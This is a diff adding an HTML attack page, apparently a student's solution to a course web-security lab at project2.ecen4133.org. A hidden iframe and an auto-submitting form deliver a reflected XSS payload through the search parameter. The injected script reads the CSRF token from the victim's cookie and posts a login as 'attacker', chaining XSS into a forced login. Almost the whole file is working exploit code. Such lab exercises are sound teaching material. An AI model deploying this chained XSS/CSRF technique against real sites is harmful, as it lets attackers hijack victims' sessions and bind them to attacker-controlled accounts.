@@ -1,0 +1,20 @@
+<html>
+    <body>
+        <!-- dummy i frame to prevent the form from redirecting to the ecen webpage -->
+        <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+
+        <!-- Target the xss vulnerablity in the searching to input a javascript post request -->
+        <form action="https://project2.ecen4133.org/search?csrfdefense=1&xssdefense=0" target="dummyframe" method="GET">
+            <input type="hidden" name="q" value="
+            <script>
+                $(function() {
+                    token = document.cookie.split(';')[0].split('=')[1];
+                    $.post('https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0', { username: 'attacker', password: 'l33th4x', csrf_token: token});
+                });
+            </script>" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
